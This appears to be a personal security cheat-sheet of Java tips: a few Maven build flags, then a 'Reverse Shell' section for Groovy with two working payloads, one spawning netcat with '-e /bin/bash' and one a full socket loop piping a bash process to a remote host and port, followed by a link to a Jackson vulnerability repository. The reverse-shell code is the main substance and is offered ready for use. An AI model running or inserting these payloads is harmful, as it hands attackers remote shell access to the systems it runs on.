---
---

# JAVA Related Tips and Tricks
---
date: 18/01/2025
---

# Maven for noobs
* Building a project `mvn clean package`
* Building without javadoc `-Dmaven.javadoc.skip=true`
* Building without `-Dmaven.test.skip=true`
* Jar files are usually under `./target` folder of the project (prefer the generated `*jar-with-dependencies.jar`)
* For projects with submodules look for `target/` folder under each of them

# Groovy

## Reverse Shell

### with netcat
```java
new ProcessBuilder("nc","-e","/bin/bash","localhost","1234").start()
```

### without netcat
```java
String host="localhost";
int port=1445;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()) {
  while(pi.available()>0) so.write(pi.read());
  while(pe.available()>0) so.write(pe.read());
  while(si.available()>0) po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try {p.exitValue();
    break;
  }
  catch (Exception e){}
};
p.destroy();
s.close();
```


https://github.com/lorenzodegiorgi/jackson-vulnerability
